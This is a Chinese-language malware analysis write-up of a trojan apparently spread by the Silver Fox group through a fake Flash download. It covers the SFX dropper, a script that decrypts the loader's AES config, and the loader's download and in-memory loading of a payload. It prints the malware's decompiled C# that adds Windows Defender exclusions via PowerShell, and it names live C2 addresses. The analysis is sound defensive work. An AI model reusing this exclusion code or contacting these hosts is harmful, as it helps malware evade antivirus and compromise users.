> 💡 **AI 总结（key-points）**
>
> 银狐组织钓鱼站下载的 Flash.zip 实为 7-Zip SFX 自解压木马，释放伪造 360 的 .NET 加载器，解密尾部 AES 配置后从 C2 拉取 payload 内存执行。
> 
> - **初始投毒：** 钓鱼站 yunduans.com 存在弱口令，页面以"缺少 Flash 插件"诱导下载，得到的 zip 内是改后缀的 exe。
> - **SFX 行为：** 配置文件位于 0x14600，InstallPath 为 `%ProgramW6432%`，解压后立即 nowait 启动 `360FileChecker.exe` 与诱饵 `系统升级维护中.txt`。
> - **配置解密：** 密文存于 PE overlay 的 `<<C7X>>`/`<<C7XE>>` 标记之间；先去掉尾部 32 字节 HMAC，前 16 字节为 IV，AES key 由 MasterKey 对 "s7-aes-v2" 做 HMAC-SHA256 得到，MasterKey 由两段异或混淆数组拼接后 SHA256 生成，可离线脚本还原。
> - **免杀与通信：** 先经 WMI 写入 Defender 排除项，失败则回退 PowerShell `Add-MpPreference`；随后构造 `S7R.<base64url(...)>` 密封参数，主 C2 `103.119.3.160:8888`，失败切备份 `woshidafuhao.cc:8899`。
> - **加载方式：** 下载的 payload 用 `Assembly.Load` 直接内存加载，可选调用 HydrateEmbeddedConfig 回填配置，再执行主逻辑，全程不落盘。

MasterKey通过DeriveMasterKey生成，然后作为hmac-sha256的key对字符串"s7-aes-v2"进行签名。根据这个逻辑就可以写出解密的脚本:

```python
import base64
import hashlib
import hmac
import hashlib

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad


ObfA = [60,145,162,85,232,23,107,192,77,47,154,113,8,211,190,70]
ObfB = [241,34,136,92,9,183,222,51,106,196,21,158,112,171,79,226,29,99,148,10]

def getEncFromFile(path):
    data = open(path, "rb").read()
    start = b"<<C7X>>"
    end = b"<<C7XE>>"

    a = data.rfind(start)
    b = data.rfind(end)

    if a < 0 or b <= a:
        return None

    a += len(start)
    while a < b and data[a] in (13, 10):
        a += 1

    sealed = data[a:b].decode('utf-8',"replace").strip()
    return sealed[4:]

def from_base64url(src):
    t = src.replace('-', '+').replace('_', '/')
    p = len(t) % 4
    if p == 2: t += "=="
    elif p == 3: t += "="
    return base64.b64decode(t)


def getMasterKey():
    key = bytearray()
    for i in range(len(ObfA)):
        key.append((ObfA[i] ^ 90 ^ (i * 17)) & 0xff)
    for i in range(len(ObfB)):
        key.append((ObfB[i] ^ 165 ^ (i * 13)) & 0xff)
    return hashlib.sha256(key).digest()


enc = getEncFromFile("360FileChecker.exe.malz")
cipher_1 = from_base64url(enc)

# 去掉后32位签名
cipher_1 = cipher_1[:-32]
iv = cipher_1[:16]
cipher_text = cipher_1[16:]

MasterKey = getMasterKey()
message = b"s7-aes-v2"

AESKey = hmac.new(MasterKey, message, hashlib.sha256).digest()

aes = AES.new(AESKey, AES.MODE_CBC, iv)
plaintext = unpad(aes.decrypt(cipher_text), AES.block_size)
print(plaintext.decode())
```

#### 添加路径和进程名到排除项

首先会通过TryEnsureOnStartup来讲文件添加到defender的排除项。在这个函数当中会通过两种方式来添加windows排除项：

1.  TryAddWmi通过WMI的MSFI_MpPreference.Add将路径和进程加入到Windows Defender的排除列表当中  
    ![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/83e365376bcf2a0c.png)

如果上面的方法失败还会调用 `TryAddPs` 通过powershell命令将路径和进程添加到defender的排除项：

```csharp
private static bool TryAddPs(List<string> paths, string proc)
{
	StringBuilder stringBuilder = new StringBuilder();
	stringBuilder.Append("$ErrorActionPreference='Stop'; function Norm([string]$p){ if([string]::IsNullOrWhiteSpace($p)){return ''}; return $p.Trim().TrimEnd([char]92,[char]47).ToLowerInvariant() }; try { ");
	foreach (string text in paths)
	{
		stringBuilder.Append("Add-MpPreference -ExclusionPath '").Append((text ?? "").Replace("'", "''")).Append("' -Force; ");
	}
	if (!string.IsNullOrEmpty(proc))
	{
		stringBuilder.Append("Add-MpPreference -ExclusionProcess '").Append(proc.Replace("'", "''")).Append("' -Force; ");
	}
	stringBuilder.Append("Start-Sleep -Milliseconds 400; $list=@((Get-MpPreference).ExclusionPath); if($null -eq $list){$list=@()}; $norm=@($list|%{Norm $_}); ");
	foreach (string p in paths)
	{
		stringBuilder.Append("if($norm -notcontains '").Append(DefenderExclusion.Norm(p).ToLowerInvariant().Replace("'", "''")).Append("'){ exit 43 }; ");
	}
	stringBuilder.Append("exit 0 } catch { exit 41 }");
	return DefenderExclusion.RunPs(stringBuilder.ToString()) == 0;
}
```

#### 下载payload

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/d4a2a3a9fd246758.png)

完成defened排除项的添加之后，会使用SealRunArgs构造Sealed 运行参数，作为后续通信的内容。text参数生成过程是这样的：

> 构造 "{host},{port},{protocol},{startup},{schTask},{crashRestart},{processDaemon},{profileId},{ownerToken}" CSV 字符串。  
> 经 SealBlob 密封后返回形如 "S7R.<base64url(IV||AES(CSV)||HMAC)>" 的密封参数字符串。

接着会通过FetchLoginModule进行payload的下载，先尝试： `103.119.3.160:8888` ，如果下载失败，则会使用host2： `woshidafuhao.cc:8899` (动态调试结果) 进行下载，下载的payload会存放在array变量当中

接着用 Assembly.Load(array) 把下载的 payload 直接加载进内存，然后可选地调用 HydrateEmbeddedConfig(array) 回填内部缺失的配置，最后调用 Run(text) 开始执行恶意功能。

## 0x04 小结

梳理下来，这个样本是个两段式木马：flash.exe 用 7-Zip SFX 自解压壳做伪装，把 360FileChecker.exe 和诱饵.txt 释放到 C:\\Program Files 下，再通过 ShellExecuteExW 启动它；360FileChecker.exe 实际是个伪装成 360 文件名的.NET 加载器，把 C2 地址用 AES 加密藏在文件末尾，联网下载 agent PE 后直接 Assembly.Load 内存执行。
